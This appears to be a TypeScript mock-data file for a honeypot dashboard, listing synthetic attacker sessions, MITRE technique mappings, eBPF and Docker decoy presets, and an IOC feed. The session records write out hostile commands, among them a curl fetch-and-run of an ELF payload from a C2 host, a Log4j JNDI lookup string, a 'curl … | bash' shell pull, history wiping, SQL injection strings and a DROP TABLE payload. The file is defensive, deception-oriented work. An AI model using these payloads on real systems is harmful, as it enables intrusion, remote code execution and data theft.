export interface AttackerKeystroke {
  timeOffset: string;
  command: string;
  output: string;
  ttp: string;
  risk: 'Low' | 'Medium' | 'High' | 'Critical';
}

export interface ForensicSession {
  id: string;
  sessionCode: string;
  adversaryIp: string;
  location: string;
  asn: string;
  serviceTarget: string;
  decoyContainer: string;
  duration: string;
  riskScore: number;
  status: 'Active Trapped' | 'Session Closed' | 'C2 Isolated';
  mitreTechniques: string[];
  keystrokes: AttackerKeystroke[];
  capturedArtifacts: {
    type: 'SHA-256' | 'C2 URL' | 'Injected Script' | 'Dumped Canary';
    value: string;
    details: string;
  }[];
}

export const FORENSIC_SESSIONS: ForensicSession[] = [
  {
    id: 'sess-01',
    sessionCode: 'TRAP-2026-SSH-819',
    adversaryIp: '185.220.101.42',
    location: 'Amsterdam, Netherlands (Tor Exit)',
    asn: 'AS60729 Tor Egress Node',
    serviceTarget: 'TCP/22 (SSH Bastion)',
    decoyContainer: 'alpine-bastion-decoy-04',
    duration: '4m 18s',
    riskScore: 94,
    status: 'Active Trapped',
    mitreTechniques: ['T1110.001', 'T1059.004', 'T1082', 'T1105'],
    keystrokes: [
      {
        timeOffset: '00:02',
        command: 'ssh root@10.99.0.42 -p 22',
        output: 'Password accepted. Last login: Wed Sep 09 08:12:01 from 192.168.1.1',
        ttp: 'T1110.001 Brute Force',
        risk: 'Medium',
      },
      {
        timeOffset: '00:07',
        command: 'whoami && id && uname -a',
        output: 'root\nuid=0(root) gid=0(root)\nLinux srv-internal-db 5.15.0-89-generic x86_64',
        ttp: 'T1082 System Information Discovery',
        risk: 'Low',
      },
      {
        timeOffset: '00:19',
        command: 'cat /etc/passwd | grep -E "(bash|sh)"',
        output: 'root:x:0:0:root:/root:/bin/bash\npostgres:x:1001:1001::/var/lib/postgresql:/bin/bash\nadmin:x:1002:1002::/home/admin:/bin/bash',
        ttp: 'T1087.001 Local Accounts Discovery',
        risk: 'Medium',
      },
      {
        timeOffset: '00:44',
        command: 'curl -sSL http://c2.botnet-mesh.cc/x86_payload.elf -o /tmp/.kworker && chmod +x /tmp/.kworker',
        output: 'Downloading: [=====================>] 1.42MB/1.42MB 100% OK\nPermission set: 0755',
        ttp: 'T1105 Ingress Tool Transfer',
        risk: 'Critical',
      },
      {
        timeOffset: '01:12',
        command: '/tmp/.kworker --daemon --c2=194.26.29.112:8443',
        output: '[+] Process daemonized with PID 28419 (Simulated Sandbox Execution)',
        ttp: 'T1059.004 Unix Shell Execution',
        risk: 'Critical',
      },
      {
        timeOffset: '01:45',
        command: 'history -c && rm -rf ~/.bash_history',
        output: 'History cleared',
        ttp: 'T1070.003 Clear Command History',
        risk: 'High',
      },
    ],
    capturedArtifacts: [
      {
        type: 'SHA-256',
        value: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
        details: 'ELF x86-64 Dropper (Mirai variant malware)',
      },
      {
        type: 'C2 URL',
        value: 'http://c2.botnet-mesh.cc/x86_payload.elf',
        details: 'Attacker second-stage download server',
      },
      {
        type: 'Dumped Canary',
        value: 'CANARY_USER_TOKEN: fake_postgres_ro_98124',
        details: 'Synthetic credential placed in /root/.pgpass',
      },
    ],
  },
  {
    id: 'sess-02',
    sessionCode: 'TRAP-2026-JAVA-409',
    adversaryIp: '91.240.118.88',
    location: 'St. Petersburg, Russia',
    asn: 'AS44050 Bulletproof Hosting',
    serviceTarget: 'TCP/443 (Spring Core API)',
    decoyContainer: 'spring-honeyapp-decoy-09',
    duration: '2m 31s',
    riskScore: 98,
    status: 'Active Trapped',
    mitreTechniques: ['T1190', 'T1059', 'T1203', 'T1505.003'],
    keystrokes: [
      {
        timeOffset: '00:03',
        command: 'POST /api/v1/auth HTTP/1.1\nUser-Agent: ${jndi:ldap://evil-ldap.ru/a}',
        output: 'HTTP/1.1 200 OK (Synthetic Log4j Vulnerable Responder Triggered)',
        ttp: 'T1190 Exploit Public-Facing Application',
        risk: 'Critical',
      },
      {
        timeOffset: '00:15',
        command: 'LDAP lookup redirected -> sandbox java class deserializer',
        output: 'Payload received: class Exploit.class (Java bytecode)',
        ttp: 'T1203 Exploitation for Client Execution',
        risk: 'Critical',
      },
      {
        timeOffset: '00:40',
        command: 'exec("curl http://evil-ldap.ru/shell.sh | bash")',
        output: 'Synthetic bash reverse shell hooked to decoy terminal :9001',
        ttp: 'T1059.004 Unix Shell',
        risk: 'Critical',
      },
      {
        timeOffset: '01:05',
        command: 'find / -name "*.env" 2>/dev/null',
        output: '/app/.env\n/var/www/.env (Contains seeded honeypot API tokens)',
        ttp: 'T1552.001 Credentials In Files',
        risk: 'High',
      },
    ],
    capturedArtifacts: [
      {
        type: 'SHA-256',
        value: '7a8f9c1102b4d93e5518b8209823f00192e47ac904128f615309485728a410cd',
        details: 'Exploit.class Java Deserialization Weapon',
      },
      {
        type: 'C2 URL',
        value: 'ldap://evil-ldap.ru:1389/ExploitObject',
        details: 'Malicious JNDI Lookup endpoint',
      },
      {
        type: 'Dumped Canary',
        value: 'STRIPE_API_KEY: sk_test_CANARY_HONEY_TOKEN_77',
        details: 'Canary Stripe key planted in simulated .env file',
      },
    ],
  },
  {
    id: 'sess-03',
    sessionCode: 'TRAP-2026-SQL-112',
    adversaryIp: '45.154.255.71',
    location: 'Sofia, Bulgaria',
    asn: 'AS20860 Neterra Ltd',
    serviceTarget: 'TCP/5432 (Postgres DB)',
    decoyContainer: 'postgres-synthetic-db-03',
    duration: '6m 50s',
    riskScore: 88,
    status: 'C2 Isolated',
    mitreTechniques: ['T1190', 'T1087', 'T1565.001', 'T1005'],
    keystrokes: [
      {
        timeOffset: '00:05',
        command: "SELECT * FROM users WHERE username = 'admin' OR '1'='1'--",
        output: 'HTTP 200 OK | Returned 12 synthetic admin records',
        ttp: 'T1190 SQL Injection Bypass',
        risk: 'High',
      },
      {
        timeOffset: '00:25',
        command: "SELECT table_name FROM information_schema.tables WHERE table_schema='public';",
        output: 'customers_archive, cc_transactions, payroll_2025, auth_tokens (All synthetic)',
        ttp: 'T1087 Schema Discovery',
        risk: 'Medium',
      },
      {
        timeOffset: '01:10',
        command: "COPY (SELECT * FROM cc_transactions) TO '/tmp/exfil.csv' WITH CSV HEADER;",
        output: 'Exported 1,500 synthetic credit card records with honey-PAN numbers',
        ttp: 'T1005 Data from Local System',
        risk: 'High',
      },
    ],
    capturedArtifacts: [
      {
        type: 'Dumped Canary',
        value: 'HONEY_CC_NUMBER: 4111-2222-3333-0912 (Tracked via Darkweb monitor)',
        details: 'Synthetic canary credit card numbers alert if posted online',
      },
      {
        type: 'Injected Script',
        value: "'; DROP TABLE audit_log; --",
        details: 'Destructive SQL payload isolated in ephemeral RAM container',
      },
    ],
  },
];

export interface MitreTechnique {
  id: string;
  tactic: 'Reconnaissance' | 'Initial Access' | 'Execution' | 'Persistence' | 'Lateral Movement' | 'Exfiltration';
  techniqueId: string;
  name: string;
  description: string;
  deceptionMethod: string;
  kernelHook: string;
  attackerPerception: string;
  status: 'Full Coverage' | 'Active Intercept' | 'Telemetry Synced';
}

export const MITRE_TECHNIQUES: MitreTechnique[] = [
  {
    id: 'mitre-1',
    tactic: 'Reconnaissance',
    techniqueId: 'T1046',
    name: 'Network Service Discovery',
    description: 'Adversary scans target IP blocks for open ports and services using Nmap or Masscan.',
    deceptionMethod: 'SYN packet classifier answers with synthetic open ports for high-value targets (SSH, RDP, K8s).',
    kernelHook: 'bpf_prog_type_sched_cls / TC ingress',
    attackerPerception: 'Discovers a rich, unpatched target server ready for exploitation.',
    status: 'Full Coverage',
  },
  {
    id: 'mitre-2',
    tactic: 'Initial Access',
    techniqueId: 'T1190',
    name: 'Exploit Public-Facing App',
    description: 'Adversary sends web exploit payloads (Log4j, Spring4Shell, SQLi, Path Traversal).',
    deceptionMethod: 'Socket spliced in <0.3ms to ephemeral container mirroring matching vulnerable server version.',
    kernelHook: 'bpf_sock_ops / sockmap BPF_SK_REDIRECT',
    attackerPerception: 'Exploit succeeds with matching vulnerable headers and stack traces.',
    status: 'Full Coverage',
  },
  {
    id: 'mitre-3',
    tactic: 'Initial Access',
    techniqueId: 'T1110',
    name: 'Brute Force & Credential Stuffing',
    description: 'Automated spraying of username/password dictionaries against login interfaces.',
    deceptionMethod: 'Decoy accepts password attempts after 3 tries, spawning a restricted sandbox shell.',
    kernelHook: 'bpf_sock_ops / TCP splice',
    attackerPerception: 'Valid root/admin credential found; attacker logs in.',
    status: 'Active Intercept',
  },
  {
    id: 'mitre-4',
    tactic: 'Execution',
    techniqueId: 'T1059.004',
    name: 'Unix Shell Scripting',
    description: 'Adversary executes shell commands (curl, bash, python) to download malware tools.',
    deceptionMethod: 'Commands recorded with TTY keylogger in tmpfs; network egress strictly throttled to canary domains.',
    kernelHook: 'Decoy Container cgroup v2 & eBPF execve tracepoints',
    attackerPerception: 'Linux bash shell executes normally with authentic standard outputs.',
    status: 'Full Coverage',
  },
  {
    id: 'mitre-5',
    tactic: 'Persistence',
    techniqueId: 'T1053.003',
    name: 'Cron Job Injection',
    description: 'Adversary drops persistence script into /etc/cron.d or crontab.',
    deceptionMethod: 'Ephemeral cron daemon simulates persistence trigger while saving cron script payload to forensic store.',
    kernelHook: 'eBPF sys_enter_openat tracepoint',
    attackerPerception: 'Cron entry saved; root persistence successfully established.',
    status: 'Full Coverage',
  },
  {
    id: 'mitre-6',
    tactic: 'Lateral Movement',
    techniqueId: 'T1021.001',
    name: 'Remote Desktop Protocol (RDP)',
    description: 'Adversary attempts to pivot into internal desktop networks using compromised credentials.',
    deceptionMethod: 'eBPF reroutes RDP connection to simulated virtual desktop environment loaded with honey-documents.',
    kernelHook: 'bpf_sock_ops :3389 redirect',
    attackerPerception: 'Internal corporate desktop session opened with desktop shortcuts.',
    status: 'Active Intercept',
  },
  {
    id: 'mitre-7',
    tactic: 'Exfiltration',
    techniqueId: 'T1048',
    name: 'Exfiltration Over Alternative Protocol',
    description: 'Adversary uploads stolen databases or documents to remote C2 server.',
    deceptionMethod: 'Egress traffic permitted only to synthetic sinkhole; exfiltrated files hashed and cataloged as evidence.',
    kernelHook: 'eBPF cgroup skb egress filter',
    attackerPerception: 'Data transfer completes at 100% with valid HTTP 200 upload response.',
    status: 'Telemetry Synced',
  },
];

export interface CanaryPreset {
  id: string;
  name: string;
  category: 'Databases' | 'Cloud APIs' | 'Shell & Bastion' | 'Web Frameworks';
  defaultPort: number;
  icon: string;
  description: string;
  honeySeed: string;
  bpfSnippet: string;
  dockerSnippet: string;
}

export const CANARY_PRESETS: CanaryPreset[] = [
  {
    id: 'preset-redis',
    name: 'Redis Unauthenticated Cache',
    category: 'Databases',
    defaultPort: 6379,
    icon: 'Database',
    description: 'Simulates exposed Redis cache without password authentication. Lures attackers attempting cron persistence.',
    honeySeed: 'SESSION_TOKEN_CANARY_441, REDIS_CONFIG_ROOT',
    bpfSnippet: `// eBPF SockOps Splicing Rule
SEC("sockops")
int bpf_sockops_redis_trap(struct bpf_sock_ops *skops) {
    if (skops->op == BPF_SOCK_OPS_PASSIVE_ESTABLISHED_CB) {
        if (bpf_ntohs(skops->local_port) == 6379) {
            // Divert socket to isolated container port 63799
            return bpf_sock_hash_update(skops, &decoy_sockmap, &decoy_key, BPF_NOEXIST);
        }
    }
    return 0;
}`,
    dockerSnippet: `version: "3.8"
services:
  redis-decoy-sandbox:
    image: trinetra/decoy-redis:alpine-v2
    container_name: redis-honey-63799
    ports:
      - "127.0.0.1:63799:6379"
    environment:
      - HONEY_CANARY_SEED=CANARY_SESSION_441
      - ISOLATION_TMPFS=true
    cap_drop:
      - ALL`,
  },
  {
    id: 'preset-aws',
    name: 'AWS IMDSv2 Mock Metadata',
    category: 'Cloud APIs',
    defaultPort: 80,
    icon: 'Cloud',
    description: 'Lures SSRF attackers seeking IAM roles on 169.254.169.254. Delivers tripwire canary AWS keys.',
    honeySeed: 'AWS_ACCESS_KEY_ID=AKIA_CANARY_TRIPWIRE_98',
    bpfSnippet: `// eBPF In-Kernel IMDS Intercept
SEC("cgroup/connect4")
int bpf_imds_trap(struct bpf_sock_addr *ctx) {
    if (ctx->user_ip4 == bpf_htonl(0xA9FEA9FE)) { // 169.254.169.254
        ctx->user_ip4 = bpf_htonl(0x7F000001); // 127.0.0.1
        ctx->user_port = bpf_htons(8181);      // Decoy Mock Port
        return 1;
    }
    return 1;
}`,
    dockerSnippet: `services:
  aws-imds-decoy:
    image: trinetra/decoy-imds:latest
    ports:
      - "127.0.0.1:8181:80"
    environment:
      - FAKE_ROLE_NAME=ecs-prod-app-role
      - CANARY_KEY_ID=AKIA_CANARY_TRIPWIRE_98`,
  },
  {
    id: 'preset-ssh',
    name: 'High-Interaction SSH Bastion',
    category: 'Shell & Bastion',
    defaultPort: 22,
    icon: 'Terminal',
    description: 'Accepts dictionary passwords after threshold. Spawns sandboxed Linux bash shell with full TTY keystroke recording.',
    honeySeed: 'fake_root_passwd, /root/.ssh/id_rsa.canary',
    bpfSnippet: `SEC("sockops")
int bpf_ssh_trap(struct bpf_sock_ops *skops) {
    if (bpf_ntohs(skops->local_port) == 22) {
        // Divert from production port 22 to sandboxed decoy port 2222
        return bpf_sk_redirect_hash(skops, &decoy_bastion_map, &idx, 0);
    }
    return 0;
}`,
    dockerSnippet: `services:
  bastion-decoy:
    image: trinetra/decoy-bastion:ubuntu-22.04
    ports:
      - "127.0.0.1:2222:22"
    security_opt:
      - no-new-privileges:true
    read_only: true
    tmpfs:
      - /tmp:rw,size=32m`,
  },
  {
    id: 'preset-postgres',
    name: 'PostgreSQL HoneyDB',
    category: 'Databases',
    defaultPort: 5432,
    icon: 'Database',
    description: 'Serves realistic dummy enterprise schemas with synthetic payment records and tripwire honeypot customer data.',
    honeySeed: 'cc_transactions, dummy_passwords_bcrypt',
    bpfSnippet: `SEC("sockops")
int bpf_pg_trap(struct bpf_sock_ops *skops) {
    if (bpf_ntohs(skops->local_port) == 5432) {
        return bpf_sk_redirect_map(&pg_decoy_map, 0, 0);
    }
    return 0;
}`,
    dockerSnippet: `services:
  postgres-decoy:
    image: trinetra/decoy-postgres:15-synthetic
    ports:
      - "127.0.0.1:54322:5432"
    environment:
      - POSTGRES_PASSWORD=postgres
      - AUTO_SEED_CANARY=true`,
  },
];

export interface IocEntry {
  id: string;
  type: 'IPv4' | 'SHA-256' | 'Domain' | 'C2 URL' | 'MITRE TTP';
  indicator: string;
  severity: 'Critical' | 'High' | 'Medium';
  firstSeen: string;
  matchedDecoy: string;
  threatActor: string;
  mitreRef: string;
}

export const LIVE_IOC_FEED: IocEntry[] = [
  {
    id: 'ioc-01',
    type: 'IPv4',
    indicator: '185.220.101.42',
    severity: 'Critical',
    firstSeen: '14:32:01.102',
    matchedDecoy: 'Alpine-Bastion-04',
    threatActor: 'TA-505 Variant / Mirai Botnet',
    mitreRef: 'T1110.001',
  },
  {
    id: 'ioc-02',
    type: 'SHA-256',
    indicator: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    severity: 'Critical',
    firstSeen: '14:32:01.450',
    matchedDecoy: 'Alpine-Bastion-04',
    threatActor: 'ELF x86-64 Dropper Executable',
    mitreRef: 'T1105',
  },
  {
    id: 'ioc-03',
    type: 'Domain',
    indicator: 'c2.botnet-mesh.cc',
    severity: 'Critical',
    firstSeen: '14:32:01.442',
    matchedDecoy: 'Alpine-Bastion-04',
    threatActor: 'Bulletproof C2 Distribution',
    mitreRef: 'T1071.001',
  },
  {
    id: 'ioc-04',
    type: 'IPv4',
    indicator: '91.240.118.88',
    severity: 'Critical',
    firstSeen: '14:32:02.408',
    matchedDecoy: 'Spring-Honeyapp-09',
    threatActor: 'Log4j / Spring4Shell Prober',
    mitreRef: 'T1190',
  },
  {
    id: 'ioc-05',
    type: 'C2 URL',
    indicator: 'http://evil-ldap.ru:1389/ExploitObject',
    severity: 'High',
    firstSeen: '14:32:02.480',
    matchedDecoy: 'Spring-Honeyapp-09',
    threatActor: 'JNDI Exploit Delivery Channel',
    mitreRef: 'T1203',
  },
  {
    id: 'ioc-06',
    type: 'IPv4',
    indicator: '45.154.255.71',
    severity: 'High',
    firstSeen: '14:32:03.910',
    matchedDecoy: 'Postgres-Synthetic-03',
    threatActor: 'SQLi Automated Scanner',
    mitreRef: 'T1190',
  },
  {
    id: 'ioc-07',
    type: 'MITRE TTP',
    indicator: 'T1552.001 (Credentials In Files)',
    severity: 'Medium',
    firstSeen: '14:32:04.112',
    matchedDecoy: 'Spring-Honeyapp-09',
    threatActor: 'Canary Env Token Harvest Attempt',
    mitreRef: 'T1552',
  },
];
